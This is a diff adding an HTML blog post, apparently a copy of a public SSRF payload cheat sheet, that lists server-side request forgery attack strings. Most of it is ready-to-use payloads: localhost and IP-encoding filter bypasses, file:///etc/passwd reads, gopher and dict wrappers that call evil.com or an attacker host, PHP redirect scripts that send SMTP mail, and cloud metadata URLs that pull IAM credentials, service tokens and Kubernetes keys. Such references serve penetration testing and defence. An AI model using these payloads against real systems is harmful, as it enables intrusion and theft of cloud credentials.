@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="pt">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>SSRF Injection  | 3ecurity</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-137778587-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-137778587-1');
+</script>
+
+
+
+    <link rel="shortcut icon" href="/images/favicon.jpg">
+
+    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 
+
+</head>
+
+
+    <body>
+      <div class="container">
+
+        
+
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2">
+            <main>
+            <div class="post">
+
+  <header class="post-header">
+    <h1>SSRF Injection </h1>
+  </header>
+
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header">
+    <p class="meta">
+        Apr 19, 2019
+        
+        
+        •
+        <span><a href="/category/#SSRF" class="reserved">SSRF</a>,</span><span><a href="/category/#Payload" class="reserved">Payload</a></span>
+    </p>
+  </header>
+
+  <article class="post-content">
+  <h1 id="server-side-request-forgery">Server-Side Request Forgery</h1>
+
+<p>Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.</p>
+
+<p>Tools:</p>
+
+<ul>
+  <li><a href="https://github.com/swisskyrepo/SSRFmap">SSRFmap - https://github.com/swisskyrepo/SSRFmap</a></li>
+  <li><a href="https://github.com/tarunkant/Gopherus">Gopherus - https://github.com/tarunkant/Gopherus</a></li>
+</ul>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li><a href="#exploit-with-localhost">Exploit with localhost</a></li>
+  <li><a href="#bypassing-filters">Bypassing filters</a></li>
+  <li><a href="#ssrf-via-url-scheme">SSRF via URL Scheme</a></li>
+  <li><a href="#ssrf-to-xss-by-d0rkerdevil--alyssaoherrera">SSRF to XSS</a></li>
+  <li><a href="#ssrf-url-for-cloud-instances">SSRF URL for Cloud Instances</a>
+    <ul>
+      <li><a href="#ssrf-url-for-aws-bucket">SSRF URL for AWS Bucket</a></li>
+      <li><a href="#ssrf-url-for-google-cloud">SSRF URL for Google Cloud</a></li>
+      <li><a href="#ssrf-url-for-digital-ocean">SSRF URL for Digital Ocean</a></li>
+      <li><a href="#ssrf-url-for-packetcloud">SSRF URL for Packetcloud</a></li>
+      <li><a href="#ssrf-url-for-azure">SSRF URL for Azure</a></li>
+      <li><a href="#ssrf-url-for-openstackrackspace">SSRF URL for OpenStack/RackSpace</a></li>
+      <li><a href="#ssrf-url-for-hp-helion">SSRF URL for HP Helion</a></li>
+      <li><a href="#ssrf-url-for-oracle-cloud">SSRF URL for Oracle Cloud</a></li>
+      <li><a href="#ssrf-url-for-kubernetes-etcd">SSRF URL for Kubernetes ETCD</a></li>
+      <li><a href="#ssrf-url-for-alibaba">SSRF URL for Alibaba</a></li>
+      <li><a href="#ssrf-url-for-docker">SSRF URL for Docker</a></li>
+      <li><a href="#ssrf-url-for-rancher">SSRF URL for Rancher</a></li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="exploit-with-localhost">Exploit with localhost</h2>
+
+<p>Basic SSRF v1</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://0.0.0.0:80
+http://0.0.0.0:443
+http://0.0.0.0:22
+</code></pre></div></div>
+
+<p>Basic SSRF - Alternative version</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:80
+http://localhost:443
+http://localhost:22
+</code></pre></div></div>
+
+<p>Advanced exploit using a redirection</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
+2. Launch the SSRF: vulnerable.com/index.php?url<span class="o">=</span>http://YOUR_SERVER_IP
+vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
+</code></pre></div></div>
+
+<p>Advanced exploit using type=url</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Change <span class="s2">"type=file"</span> to <span class="s2">"type=url"</span>
+Paste URL <span class="k">in </span>text field and hit enter
+<span class="k">Using </span>this vulnerability <span class="nb">users </span>can upload images <span class="k">from </span>any image URL <span class="o">=</span> trigger an SSRF
+</code></pre></div></div>
+
+<h2 id="bypassing-filters">Bypassing filters</h2>
+
+<p>Bypass using HTTPS</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://127.0.0.1/
+https://localhost/
+</code></pre></div></div>
+
+<p>Bypass localhost with [::]</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[::]:80/
+http://[::]:25/ SMTP
+http://[::]:22/ SSH
+http://[::]:3128/ Squid
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://0000::1:80/
+http://0000::1:25/ SMTP
+http://0000::1:22/ SSH
+http://0000::1:3128/ Squid
+</code></pre></div></div>
+
+<p>Bypass localhost with a domain redirecting to locahost</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localtest.me
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+http://mail.ebc.apple.com redirect to 127.0.0.6 <span class="o">==</span> localhost
+</code></pre></div></div>
+
+<p>The service nip.io is awesome for that, it will convert any ip address as a dns.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NIP.IO maps &lt;anything&gt;.&lt;IP Address&gt;.nip.io to the corresponding &lt;IP Address&gt;, even 127.0.0.1.nip.io maps to 127.0.0.1
+</code></pre></div></div>
+
+<p>Bypass localhost with CIDR : 127.x.x.x</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>it<span class="s1">'s a /8
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+</span></code></pre></div></div>
+
+<p>Bypass using a decimal ip location</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://0177.0.0.1/
+http://2130706433/ <span class="o">=</span> http://127.0.0.1
+http://3232235521/ <span class="o">=</span> http://192.168.0.1
+http://3232235777/ <span class="o">=</span> http://192.168.1.1
+</code></pre></div></div>
+
+<p>Bypass using malformed urls</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>localhost:+11211aaa
+localhost:00011211aaaa
+</code></pre></div></div>
+
+<p>Bypass using rare address</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://0/
+</code></pre></div></div>
+
+<p>Bypass using bash variables (curl only)</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">curl</span> -v <span class="s2">"http://evil</span><span class="nv">$google</span><span class="s2">.com"</span>
+<span class="nv">$google</span> <span class="o">=</span> <span class="s2">""</span>
+</code></pre></div></div>
+
+<p>Bypass using tricks combination</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/
+urllib2 : 1.1.1.1
+requests + browsers : 2.2.2.2
+urllib : 3.3.3.3
+</code></pre></div></div>
+
+<p>Bypass using enclosed alphanumerics <a href="https://twitter.com/EdOverflow">@EdOverflow</a></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ <span class="o">=</span> example.com
+
+List:
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
+</code></pre></div></div>
+
+<p>Bypass against a weak parser - by Orange Tsai (<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a>)</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+</code></pre></div></div>
+
+<p><img src="/images/posts/2019/SSRF_Parser.png" alt="SSRF_Parser.png" /></p>
+
+<h2 id="ssrf-via-url-scheme">SSRF via URL Scheme</h2>
+
+<p>File Wrapper</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file:///etc/passwd
+file://\/\/etc/passwd
+</code></pre></div></div>
+
+<p>Dict Wrapper
+The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;:&lt;database&gt;:&lt;n&gt;
+ssrf.php?url<span class="o">=</span>dict://attacker:11111/
+</code></pre></div></div>
+
+<p>Sftp Wrapper</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssrf.php?url<span class="o">=</span>sftp://evil.com:11111/
+</code></pre></div></div>
+
+<p>Tftp Wrapper</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssrf.php?url<span class="o">=</span>tftp://evil.com:12346/TESTUDPPACKET
+</code></pre></div></div>
+
+<p>Ldap Wrapper</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssrf.php?url<span class="o">=</span>ldap://localhost:11211/%0astats%0aquit
+</code></pre></div></div>
+
+<p>Gopher Wrapper</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssrf.php?url<span class="o">=</span>gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
+
+will make a request like
+HELO localhost
+MAIL <span class="k">FROM</span>:&lt;hacker@site.com&gt;
+RCPT TO:&lt;victim@site.com&gt;
+<span class="k">DATA
+From</span>: <span class="o">[</span>Hacker] &lt;hacker@site.com&gt;
+To: &lt;victime@site.com&gt;
+Date: Tue, 15 Sep 2017 17:20:26 -0400
+Subject: Ah Ah AH
+
+You didn<span class="s1">'t say the magic word !
+
+
+.
+QUIT
+</span></code></pre></div></div>
+
+<p>Gopher SMTP - Back connect to 1337</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Content of evil.com/redirect.php:
+<span class="cp">&lt;?php</span>
+<span class="nb">header</span><span class="p">(</span><span class="s2">"Location: gopher://hack3r.site:1337/_SSRF%0ATest!"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+
+Now query it.
+https://example.com/?q=http://evil.com/redirect.php.
+</code></pre></div></div>
+
+<p>Gopher SMTP - send a mail</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Content of evil.com/redirect.php:
+<span class="cp">&lt;?php</span>
+        <span class="nv">$commands</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+                <span class="s1">'HELO victim.com'</span><span class="p">,</span>
+                <span class="s1">'MAIL FROM: &lt;admin@victim.com&gt;'</span><span class="p">,</span>
+                <span class="s1">'RCPT To: &lt;sxcurity@oou.us&gt;'</span><span class="p">,</span>
+                <span class="s1">'DATA'</span><span class="p">,</span>
+                <span class="s1">'Subject: @sxcurity!'</span><span class="p">,</span>
+                <span class="s1">'Corben was here, woot woot!'</span><span class="p">,</span>
+                <span class="s1">'.'</span>
+        <span class="p">);</span>
+
+        <span class="nv">$payload</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'%0A'</span><span class="p">,</span> <span class="nv">$commands</span><span class="p">);</span>
+
+        <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: gopher://0:25/_'</span><span class="o">.</span><span class="nv">$payload</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h2 id="ssrf-to-xss-by-d0rkerdevil--alyssaoherrera">SSRF to XSS by <a href="https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158">@D0rkerDevil &amp; @alyssa.o.herrera</a></h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://brutelogic.com.br/poc.svg -&gt; simple alert
+https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri<span class="o">=</span> -&gt; simple ssrf
+
+https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri<span class="o">=</span>http://brutelogic.com.br/poc.svg
+</code></pre></div></div>
+
+<h2 id="ssrf-url-for-cloud-instances">SSRF URL for Cloud Instances</h2>
+
+<h3 id="ssrf-url-for-aws-bucket">SSRF URL for AWS Bucket</h3>
+
+<p><a href="http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories">Docs</a>
+Interesting path to look for at <code class="highlighter-rouge">http://169.254.169.254</code></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Always here : /latest/meta-data/<span class="o">{</span><span class="nb">hostname</span>,public-ipv4,...<span class="o">}</span>
+User <span class="k">data</span> <span class="o">(</span>startup script <span class="k">for </span>auto-scaling<span class="o">)</span> : /latest/user-data
+Temporary AWS credentials : /latest/meta-data/iam/security-credentials/
+</code></pre></div></div>
+
+<p>DNS record</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://169.254.169.254
+http://metadata.nicob.net/
+http://169.254.169.254.xip.io/
+http://1ynrnhl.xip.io/
+http://www.owasp.org.1ynrnhl.xip.io/
+</code></pre></div></div>
+
+<p>HTTP redirect</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Static:http://nicob.net/redir6a
+Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
+</code></pre></div></div>
+
+<p>Alternate IP encoding</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://425.510.425.510/ Dotted <span class="kt">decimal </span>with overflow
+http://2852039166/ Dotless <span class="kt">decimal
+</span>http://7147006462/ Dotless <span class="kt">decimal </span>with overflow
+http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
+http://0xA9FEA9FE/ Dotless hexadecimal
+http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
+http://0251.0376.0251.0376/ Dotted octal
+http://0251.00376.000251.0000376/ Dotted octal with padding
+</code></pre></div></div>
+
+<p>More urls to include</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+</code></pre></div></div>
+
+<p>E.g: Jira SSRF leading to AWS info disclosure - <code class="highlighter-rouge">https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance</code></p>
+
+<h3 id="ssrf-url-for-google-cloud">SSRF URL for Google Cloud</h3>
+
+<p>Requires the header “Metadata-Flavor: Google” or “X-Google-Metadata-Request: True”</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+</code></pre></div></div>
+
+<p>Google allows recursive pulls</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive<span class="o">=</span><span class="nb">true</span>
+</code></pre></div></div>
+
+<p>Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://metadata.google.internal/computeMetadata/v1beta1/
+http://metadata.google.internal/computeMetadata/v1beta1/?recursive<span class="o">=</span><span class="nb">true</span>
+</code></pre></div></div>
+
+<p>Interesting files to pull out:</p>
+
+<ul>
+  <li>SSH Public Key : <code class="highlighter-rouge">http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json</code></li>
+  <li>Get Access Token : <code class="highlighter-rouge">http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</code></li>
+  <li>Kubernetes Key : <code class="highlighter-rouge">http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json</code></li>
+</ul>
+
+<h3 id="ssrf-url-for-digital-ocean">SSRF URL for Digital Ocean</h3>
+
+<p>Documentation available at <code class="highlighter-rouge">https://developers.digitalocean.com/documentation/metadata/</code></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">curl </span>http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/ 
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+
+All <span class="k">in </span>one request:
+<span class="nb">curl </span>http://169.254.169.254/metadata/v1.json | jq
+</code></pre></div></div>
+
+<h3 id="ssrf-url-for-packetcloud">SSRF URL for Packetcloud</h3>
+
+<p>Documentation available at <code class="highlighter-rouge">https://metadata.packet.net/userdata</code></p>
+
+<h3 id="ssrf-url-for-azure">SSRF URL for Azure</h3>
+
+<p>Limited, maybe more exists? <code class="highlighter-rouge">https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/</code></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://169.254.169.254/metadata/v1/maintenance
+</code></pre></div></div>
+
+<p>Update Apr 2017, Azure has more support; requires the header “Metadata: true” <code class="highlighter-rouge">https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service</code></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://169.254.169.254/metadata/instance?api-version<span class="o">=</span>2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version<span class="o">=</span>2017-04-02&amp;format<span class="o">=</span>text
+</code></pre></div></div>
+
+<h3 id="ssrf-url-for-openstackrackspace">SSRF URL for OpenStack/RackSpace</h3>
+
+<p>(header required? unknown)</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://169.254.169.254/openstack
+</code></pre></div></div>
+
+<h3 id="ssrf-url-for-hp-helion">SSRF URL for HP Helion</h3>
+
+<p>(header required? unknown)</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://169.254.169.254/2009-04-04/meta-data/ 
+</code></pre></div></div>
+
+<h3 id="ssrf-url-for-oracle-cloud">SSRF URL for Oracle Cloud</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/
+</code></pre></div></div>
+
+<h3 id="ssrf-url-for-alibaba">SSRF URL for Alibaba</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+</code></pre></div></div>
+
+<h3 id="ssrf-url-for-kubernetes-etcd">SSRF URL for Kubernetes ETCD</h3>
+
+<p>Can contain API keys and internal ip and ports</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">curl</span> -L http://127.0.0.1:2379/version
+<span class="nb">curl </span>http://127.0.0.1:2379/v2/keys/?recursive<span class="o">=</span><span class="nb">true</span>
+</code></pre></div></div>
+
+<h3 id="ssrf-url-for-docker">SSRF URL for Docker</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:2375/v1.24/containers/json
+
+Simple example
+docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
+bash-4.4# <span class="nb">curl</span> --unix-socket /var/run/docker.sock http://foo/containers/json
+bash-4.4# <span class="nb">curl</span> --unix-socket /var/run/docker.sock http://foo/images/json
+</code></pre></div></div>
+
+<h3 id="ssrf-url-for-rancher">SSRF URL for Rancher</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">curl </span>http://rancher-metadata/&lt;version&gt;/&lt;path&gt;
+</code></pre></div></div>
+
+<p>More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/</p>
+
+<h2 id="examples">Examples</h2>
+
+<ul>
+  <li><a href="https://hackerone.com/reports/115857">SSRF and local file read in video to gif converter</a></li>
+  <li><a href="https://hackerone.com/reports/115748">SSRF in https://imgur.com/vidgif/url</a></li>
+  <li><a href="https://hackerone.com/reports/358119">SSRF in proxy.duckduckgo.com</a></li>
+  <li><a href="https://hackerone.com/reports/374737">Blind SSRF on errors.hackerone.net</a></li>
+  <li><a href="https://hackerone.com/reports/382612">SSRF on *shopifycloud.com</a></li>
+</ul>
+
+<h2 id="thanks-to">Thanks to</h2>
+
+<ul>
+  <li><a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF">Hackerone - How To: Server-Side Request Forgery (SSRF)</a></li>
+  <li><a href="https://twitter.com/albinowax/status/890725759861403648">Awesome URL abuse for SSRF by @orange_8361 #BHUSA</a></li>
+  <li><a href="http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html">How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai</a></li>
+  <li><a href="https://www.youtube.com/watch?v=D1S-G8rJrEk">#HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai</a></li>
+  <li><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/">SSRF Tips - xl7dev</a></li>
+  <li><a href="https://hackerone.com/reports/115748">SSRF in https://imgur.com/vidgif/url</a></li>
+  <li><a href="https://www.dailysecurity.fr/server-side-request-forgery/">Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat</a></li>
+  <li><a href="http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf">AppSecEU15 Server side browsing considered harmful - @Agarri</a></li>
+  <li><a href="https://twitter.com/EdOverflow">Enclosed alphanumerics - @EdOverflow</a></li>
+  <li><a href="http://www.sxcurity.pro/2017/12/17/hackertarget/">Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity</a></li>
+  <li><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">PHP SSRF @secjuice</a></li>
+  <li><a href="https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158">How I convert SSRF to xss in a ssrf vulnerable Jira</a></li>
+  <li><a href="https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a">Piercing the Veil: Server Side Request Forgery to NIPRNet access</a></li>
+  <li><a href="https://www.youtube.com/watch?v=66ni2BTIjS8">Hacker101 SSRF</a></li>
+  <li><a href="https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/">SSRF脆弱性を利用したGCE/GKEインスタンスへの攻撃例</a></li>
+</ul>
+
+
+  </article>
+</div>
+
+  </article>
+
+</div>
+
+            </main>
+          </div>
+	</div>
+	</div>
+    </body>
+</html>
